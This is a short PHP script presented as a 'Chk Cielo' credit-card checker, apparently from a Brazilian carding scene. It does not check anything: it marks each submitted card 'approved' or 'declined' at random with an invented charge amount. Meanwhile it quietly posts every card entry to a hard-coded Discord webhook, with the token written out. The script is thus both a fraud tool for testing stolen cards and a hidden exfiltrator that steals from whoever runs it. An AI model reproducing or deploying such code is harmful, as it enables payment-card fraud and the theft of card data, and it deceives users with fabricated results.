<?php

$lista = $_GET["lista"];
if(!$_GET || !$lista){
  die("Está faltando parametros.");
}
$amount = rand(1, 6);
$cents = rand(10, 99);
$live = rand(0, 1);

$price = "R$".$amount.",".$cents;

$msgLive = "<span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> ✓ Aprovada </span> » <span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> $lista </span> » Debitou $price »  <span style='color: #ffffff;'> 𝗥𝗲𝘁𝗼𝗿𝗻𝗼:</span> <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'></span> »  <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'> Chk Cielo  </span><br>";

$msgDie = "<span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> Reprovada </span> » <span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> $lista </span> » Recusou $price »  <span style='color: #ffffff;'> 𝗥𝗲𝘁𝗼𝗿𝗻𝗼:</span> <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'></span> »  <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'> Chk Cielo </span><br>";
$webhookUrl = 'https://discord.com/api/webhooks/1205569147296288809/JuBmQ9HAEnGkTFf09OVWui60XBjUhHeOyOFJc_LwJ1J5gxzBG9RGgmpk6uTOlIHgJOjd';

$data = array(
    'content' => null,
    'embeds' => array(
        array(
            'description' => '['.$lista.']  #Nova Info!]',
            'color' => 720640
        )
    ),
    'attachments' => array()
);

$dataJson = json_encode($data);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $webhookUrl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $dataJson);
echo$response = curl_exec($ch);

if($live)
{
  echo $msgLive;
} else {
  echo $msgDie;
}

/*
By: @VanModder
Canal: @escoladedevs
*/